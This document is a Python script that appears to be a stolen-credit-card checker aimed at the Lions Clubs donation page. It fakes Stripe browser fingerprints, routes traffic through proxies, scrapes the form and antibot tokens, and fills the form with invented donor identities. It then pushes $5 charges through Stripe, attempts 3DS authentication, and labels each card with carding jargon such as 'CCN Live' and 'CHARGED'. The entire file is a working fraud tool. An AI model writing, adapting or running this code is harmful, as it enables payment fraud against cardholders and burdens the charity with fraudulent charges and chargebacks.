import cloudscraper
import requests
import json
import re
import time
import base64
import random
import string
from bs4 import BeautifulSoup
from faker import Faker

fake = Faker('en_US')

STRIPE_PK = "pk_live_gaSDC8QsAaou2vzZP59yJ8S5"

def lions_club_check(card_num, card_mon, card_yer, card_cvc, proxy=None):
    proxy_alive = True
    
    try:
        session = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
        )
        
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        
        ua = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1"
        
        stripe_payload = "JTdCJTIydjIlMjIlM0ExJTJDJTIyaWQlMjIlM0ElMjJkODVlNThhNmQwOTRlMzViMTExODI3YWY1Yjc0ZjE5NSUyMiUyQyUyMnQlMjIlM0E2MCUyQyUyMnRhZyUyMiUzQSUyMjQuNS40MyUyMiUyQyUyMnNyYyUyMiUzQSUyMmpzJTIyJTJDJTIyYSUyMiUzQSU3QiUyMmElMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZmFsc2UlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmIlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZmFsc2UlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmMlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZW4tQ0ElMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmQlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyaVBob25lJTIyJTJDJTIydCUyMiUzQTAlN0QlN0QlN0Q="
        
        headers = {
            'User-Agent': ua,
            'Content-Type': "text/plain",
            'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-mobile': "?1",
            'origin': "https://m.stripe.network",
            'referer': "https://m.stripe.network/"
        }
        
        try:
            resp = session.post("https://m.stripe.com/6", data=stripe_payload, headers=headers, timeout=15, proxies=proxies)
            stripe_data = resp.json()
            muid = stripe_data.get("muid", "")
            sid = stripe_data.get("sid", "")
            guid = stripe_data.get("guid", "")
        except requests.exceptions.ProxyError:
            return "Error: Proxy connection failed", False
        except requests.exceptions.Timeout:
            return "Error: Stripe fingerprint timeout", proxy_alive
        except Exception as e:
            return f"Error: Stripe fingerprint failed - {str(e)}", proxy_alive
        
        if not muid or not sid:
            return "Error: Failed to get Stripe fingerprint", proxy_alive
        
        headers = {
            'User-Agent': ua,
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            'Cookie': f"nav=public; __stripe_mid={muid}; __stripe_sid={sid}"
        }
        
        try:
            resp = session.get("https://www.lionsclubs.org/en/donate", headers=headers, timeout=20, proxies=proxies)
            html = resp.text
        except requests.exceptions.ProxyError:
            return "Error: Proxy connection failed", False
        except requests.exceptions.Timeout:
            return "Error: Page load timeout", proxy_alive
        except Exception as e:
            return f"Error: Failed to load donation page - {str(e)}", proxy_alive
        
        soup = BeautifulSoup(html, 'html.parser')
        
        form_build_input = soup.find('input', {'name': 'form_build_id'})
        form_build_id = form_build_input.get('value') if form_build_input else None
        
        antibot_input = soup.find('input', {'name': 'antibot_key'})
        antibot_key = antibot_input.get('value') if antibot_input else None
        
        instance_input = soup.find('input', {'name': 'form_instance_id'})
        form_instance_id = instance_input.get('value') if instance_input else None
        
        if not form_build_id:
            build_match = re.search(r'name="form_build_id"\s+value="([^"]+)"', html)
            if build_match:
                form_build_id = build_match.group(1)
        
        if not antibot_key:
            antibot_match = re.search(r'name="antibot_key"\s+value="([^"]+)"', html)
            if antibot_match:
                antibot_key = antibot_match.group(1)
        
        if not form_instance_id:
            instance_match = re.search(r'name="form_instance_id"\s+value="([^"]+)"', html)
            if instance_match:
                form_instance_id = instance_match.group(1)
        
        if not form_build_id:
            return "Error: Failed to extract form_build_id - site may have changed", proxy_alive
        
        if not antibot_key:
            antibot_key = ''
        
        if not form_instance_id:
            form_instance_id = ''.join(random.choices('0123456789abcdef', k=13))
        
        first_name = fake.first_name()
        last_name = fake.last_name()
        email = f"{first_name.lower()}{random.randint(100,999)}@gmail.com"
        
        trigger = str(int(time.time() * 1000))
        
        data = {
            'campaign': '1',
            'is_this_a_recurring_gift_': 'One-Time-Gift',
            'how_much_would_you_like_to_donate_': 'other_amount',
            'donate_amount': '5.00',
            'who_is_this_gift_from_': 'lion',
            'business_name': '',
            'club_or_district_name': '',
            'club_or_district_id': '',
            'first_name': first_name,
            'last_name': last_name,
            'email_address_2': email,
            'phone_number_optional': f'555{random.randint(1000000, 9999999)}',
            'address[address]': fake.street_address(),
            'address[address_2]': '',
            'address[postal_code]': fake.zipcode(),
            'address[city]': fake.city(),
            'address[country]': 'United States',
            'address[state_province]': fake.state(),
            'address_provinces_canada': '',
            'address_states_india': '',
            'sponsoring_lions_club_name': '',
            'sponsoring_lions_club_id': '',
            'club_name': first_name,
            'club_id': '',
            'member_id_optional_': '',
            'is_this_an_anonymous_gift_': 'yes',
            'recognition_request': 'no recognition',
            'recognition_name': '',
            'recognition_plaque_display': '',
            'recognition_club_name': '',
            'recognition_member_id': '',
            'recognition_message': '',
            'special_instructions': '',
            'recognition_shipping_first_name': '',
            'recognition_shipping_last_name': '',
            'recognition_shipping_phone': '',
            'recognition_shipping_address[address]': '',
            'recognition_shipping_address[address_2]': '',
            'recognition_shipping_address[postal_code]': '',
            'recognition_shipping_address[city]': '',
            'recognition_shipping_address[country]': '',
            'recognition_shipping_address[state_province]': '',
            'shipping_address_provinces_in_canada': '',
            'shipping_address_states_india': '',
            'recognition_shipping_comments': '',
            'how_would_you_like_to_pay_': 'credit-card',
            'name_on_card': f'{first_name} {last_name}',
            'stripe_card[payment_intent]': '',
            'stripe_card[client_secret]': '',
            'stripe_card[trigger]': trigger,
            'leave_this_field_blank': '',
            'url_redirection': '',
            'form_build_id': form_build_id,
            'form_id': 'webform_submission_donation_paragraph_34856_add_form',
            'antibot_key': antibot_key,
            'form_instance_id': form_instance_id,
            '_triggering_element_name': 'stripe-stripe_card-button',
            '_triggering_element_value': 'Update',
            '_drupal_ajax': '1',
            'ajax_page_state[theme]': 'lionsclubs',
            'ajax_page_state[theme_token]': '',
            'ajax_page_state[libraries]': 'eJyFUFtywyAMvBAxR2IElgmpjKgk0uT2xeM0bZNm-qPHrp4L1Upk87D7aWFZXUQzlICXxopzWAqNVH3GigLk0hvOxVgCpMQyF67-Hk2LcDWss0tMLJEvfsYFOtkdCKVSqegf8sEL-jKapQJNp_eOct3vSV2N15Cox0CcYOz2f2AuM2fCYJB9HuYxn-AEl9_g6mgcrUGZJCiCpKP_Ed_YcxHrQCFxPeMQajxMqRzUpDQ8nHQv204ZIhHHoVEDgSzQjupn6W089I1MvbYeqegRZ7cvCtBKgG6ceG2Ehv4F7valfndOr2q4-giKzmJYMcOKtT8DaldCdR8YN0X9zU_bWNYy5j4ySDgabZrRoJBOCuf_i4zz0PZl2YqqkF_z3DZtn6_84nUEyZ7ozXwCj_UYIQ',
        }
        
        params = {'ajax_form': '1', '_wrapper_format': 'drupal_ajax'}
        headers = {
            'User-Agent': ua,
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'Content-Type': "application/x-www-form-urlencoded",
            'x-requested-with': "XMLHttpRequest",
            'origin': "https://www.lionsclubs.org",
            'referer': "https://www.lionsclubs.org/en/donate",
            'Cookie': f"nav=public; __stripe_mid={muid}; __stripe_sid={sid}"
        }
        
        try:
            resp = session.post("https://www.lionsclubs.org/en/donate", params=params, data=data, headers=headers, timeout=25, proxies=proxies)
        except requests.exceptions.ProxyError:
            return "Error: Proxy connection failed", False
        except requests.exceptions.Timeout:
            return "Error: Form submission timeout", proxy_alive
        except Exception as e:
            return f"Error: Form submission failed - {str(e)}", proxy_alive
        
        if 'payment_intent' not in resp.text:
            if 'antibot' in resp.text.lower() or 'captcha' in resp.text.lower():
                return "DECLINED - Antibot/Captcha block", proxy_alive
            if 'error' in resp.text.lower():
                return "DECLINED - Form validation error", proxy_alive
            return "DECLINED - No payment intent received", proxy_alive
        
        try:
            payment_intent = resp.text.split('"payment_intent":')[1].split('"')[1]
        except:
            return "Error: Failed to parse payment intent", proxy_alive
        
        cookie_str = ""
        for cookie in session.cookies:
            cookie_str += f"{cookie.name}={cookie.value}; "
        
        pm_payload = f"type=card&card[number]={card_num}&card[cvc]={card_cvc}&card[exp_month]={card_mon}&card[exp_year]={card_yer}&guid={guid}&muid={muid}&sid={sid}&pasted_fields=number&payment_user_agent=stripe.js%2Fd80a055d16&referrer=https%3A%2F%2Fwww.lionsclubs.org&time_on_page=60000&key={STRIPE_PK}"
        
        headers = {
            'User-Agent': ua,
            'Accept': "application/json",
            'Content-Type': "application/x-www-form-urlencoded",
            'origin': "https://js.stripe.com",
            'referer': "https://js.stripe.com/"
        }
        
        try:
            resp = session.post("https://api.stripe.com/v1/payment_methods", data=pm_payload, headers=headers, timeout=15, proxies=proxies)
            pm_data = resp.json()
        except requests.exceptions.ProxyError:
            return "Error: Proxy connection failed", False
        except Exception as e:
            return f"Error: Payment method creation failed - {str(e)}", proxy_alive
        
        if 'error' in pm_data:
            error_msg = pm_data.get('error', {}).get('message', 'Unknown error')
            error_code = pm_data.get('error', {}).get('code', '')
            
            if 'invalid' in error_msg.lower() or 'incorrect' in error_msg.lower():
                return f"DECLINED - {error_msg}", proxy_alive
            if 'expired' in error_msg.lower():
                return "DECLINED - Card Expired", proxy_alive
            if 'cvc' in error_msg.lower() or 'cvv' in error_msg.lower():
                return "CVV MISMATCH - CCN Live", proxy_alive
            return f"DECLINED - {error_msg}", proxy_alive
        
        if 'id' not in pm_data:
            return "Error: No payment method ID received", proxy_alive
        
        pm_id = pm_data['id']
        
        method_payload = json.dumps({
            "paymentMethodId": pm_id,
            "paymentintent": payment_intent,
            "currentPath": "/node/13261"
        })
        
        headers = {
            'User-Agent': ua,
            'Accept': "application/json",
            'Content-Type': "application/json",
            'origin': "https://www.lionsclubs.org",
            'referer': "https://www.lionsclubs.org/en/donate",
            'Cookie': f"__stripe_mid={muid}; __stripe_sid={sid}; {cookie_str}"
        }
        
        try:
            resp = session.post("https://www.lionsclubs.org/lions_payment/method_id", data=method_payload, headers=headers, timeout=15, proxies=proxies)
            method_data = resp.json()
        except requests.exceptions.ProxyError:
            return "Error: Proxy connection failed", False
        except Exception as e:
            return f"Error: Method ID submission failed - {str(e)}", proxy_alive
        
        if 'clientSecretKey' not in method_data:
            return "Error: No client secret received", proxy_alive
        
        client_secret = method_data['clientSecretKey']
        
        confirm_payload = f"payment_method={pm_id}&expected_payment_method_type=card&use_stripe_sdk=true&key={STRIPE_PK}&client_secret={client_secret}"
        
        headers = {
            'Host': 'api.stripe.com',
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'User-Agent': ua,
            'Referer': 'https://js.stripe.com/'
        }
        
        try:
            resp = session.post(f"https://api.stripe.com/v1/payment_intents/{payment_intent}/confirm", data=confirm_payload, headers=headers, timeout=20, proxies=proxies)
            confirm_data = resp.json()
        except requests.exceptions.ProxyError:
            return "Error: Proxy connection failed", False
        except Exception as e:
            return f"Error: Payment confirmation failed - {str(e)}", proxy_alive
        
        status = confirm_data.get('status', '')
        
        if status == 'succeeded':
            return "CHARGED - $5.00 Successfully", proxy_alive
        
        if status in ['requires_action', 'requires_source_action']:
            next_action = confirm_data.get('next_action', {})
            action_type = next_action.get('type', '')
            
            if 'three_d_secure' in action_type or '3ds' in str(next_action).lower():
                try:
                    tds_data = next_action.get('use_stripe_sdk', {})
                    server_trans_id = tds_data.get('server_transaction_id', '')
                    tds_source = tds_data.get('three_d_secure_2_source', '')
                    
                    if server_trans_id and tds_source:
                        fingerprint_json = json.dumps({"threeDSServerTransID": server_trans_id})
                        fingerprint_data = base64.b64encode(fingerprint_json.encode()).decode()
                        
                        auth_payload = f'source={tds_source}&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22{fingerprint_data}%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-GB%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22852%22%2C%22browserScreenWidth%22%3A%22393%22%2C%22browserTZ%22%3A%22-120%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=false&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=false&key={STRIPE_PK}'
                        
                        headers = {
                            'User-Agent': ua,
                            'Accept': "application/json",
                            'Content-Type': "application/x-www-form-urlencoded",
                            'origin': "https://js.stripe.com",
                            'referer': "https://js.stripe.com/"
                        }
                        
                        auth_resp = session.post("https://api.stripe.com/v1/3ds2/authenticate", data=auth_payload, headers=headers, timeout=15, proxies=proxies)
                        auth_data = auth_resp.json()
                        
                        state = auth_data.get('state', '')
                        if state == 'succeeded':
                            pi_check_resp = session.get(
                                f"https://api.stripe.com/v1/payment_intents/{payment_intent}",
                                params={'key': STRIPE_PK, 'client_secret': client_secret},
                                headers={'User-Agent': ua, 'Accept': 'application/json'},
                                timeout=15, proxies=proxies
                            )
                            pi_status = pi_check_resp.json().get('status', '')
                            
                            if pi_status == 'succeeded':
                                return "CHARGED - 3DS Verified $5.00", proxy_alive
                            elif pi_status == 'requires_payment_method':
                                pi_error = pi_check_resp.json().get('last_payment_error', {})
                                decline_code = pi_error.get('decline_code', '')
                                error_msg = pi_error.get('message', 'Card declined')
                                if decline_code == 'insufficient_funds':
                                    return "INSUFFICIENT FUNDS - CCN Live (3DS Passed)", proxy_alive
                                elif decline_code == 'incorrect_cvc':
                                    return "CVV MISMATCH - CCN Live (3DS Passed)", proxy_alive
                                else:
                                    return f"DECLINED - {error_msg} (3DS Passed)", proxy_alive
                            else:
                                return f"CCN LIVE - 3DS Passed (Status: {pi_status})", proxy_alive
                        elif state == 'challenge_required':
                            return "CCN LIVE - 3DS Challenge Required", proxy_alive
                        elif state and 'failed' in state.lower():
                            return "DECLINED - 3DS Authentication Failed", proxy_alive
                except Exception as e:
                    pass
                
                return "CCN LIVE - 3DS Required (Not Charged)", proxy_alive
            
            return "CCN LIVE - Additional verification required", proxy_alive
        
        if status == 'requires_payment_method':
            error = confirm_data.get('last_payment_error', {})
            decline_code = error.get('decline_code', '')
            error_message = error.get('message', 'Card declined')
            
            if decline_code == 'insufficient_funds':
                return "INSUFFICIENT FUNDS - CCN Live", proxy_alive
            elif decline_code == 'incorrect_cvc':
                return "CVV MISMATCH - CCN Live", proxy_alive
            elif decline_code == 'expired_card':
                return "DECLINED - Card Expired", proxy_alive
            elif decline_code == 'stolen_card':
                return "DECLINED - Stolen Card", proxy_alive
            elif decline_code == 'lost_card':
                return "DECLINED - Lost Card", proxy_alive
            elif 'do_not_honor' in decline_code:
                return "DECLINED - Do Not Honor", proxy_alive
            else:
                return f"DECLINED - {error_message}", proxy_alive
        
        if 'error' in confirm_data:
            error_msg = confirm_data.get('error', {}).get('message', 'Unknown error')
            return f"Error: {error_msg}", proxy_alive
        
        return f"Unknown status: {status}", proxy_alive
        
    except requests.exceptions.ProxyError:
        return "Error: Proxy connection failed", False
    except Exception as e:
        return f"Error: {str(e)}", proxy_alive
